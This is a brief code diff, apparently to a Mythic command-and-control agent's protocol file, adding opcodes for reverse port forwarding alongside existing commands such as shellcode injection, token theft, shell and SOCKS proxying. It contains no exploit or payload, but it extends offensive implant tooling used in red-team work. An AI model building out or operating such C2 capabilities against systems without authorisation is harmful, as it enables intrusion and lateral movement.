@@ -16,6 +16,7 @@ MYTHIC_P2P_MSG = 0x06
 MYTHIC_P2P_REMOVE = 0x07
 MYTHIC_SOCKS_DATA = 0x08
 MYTHIC_FILE_BROWSER = 0x09
+MYTHIC_RPORTFWD_DATA = 0x0A
 # Mythic Responses
 MYTHIC_NORMAL_RESP = 0xAA
 MYTHIC_DOWNLOAD_RESP = 0xAB
@@ -40,6 +41,7 @@ commands = {
     "spawnto": 0x55,
     "inject_shellcode": 0x56,
     "socks": 0x57,
+    "rportfwd": 0x58,
     "shell": 0x60, 
     "getuid": 0x70, 
     "steal_token": 0x71, 
@@ -55,7 +57,8 @@ commands = {
     "p2p_resp": 0xCB,
     "download_resp": 0xCC,
     "upload_resp": 0xCD,
-    "socks_resp": 0xCE
+    "socks_resp": 0xCE,
+    "rportfwd_resp": 0xCF
 }
 
 def get_operator_command(command_name):
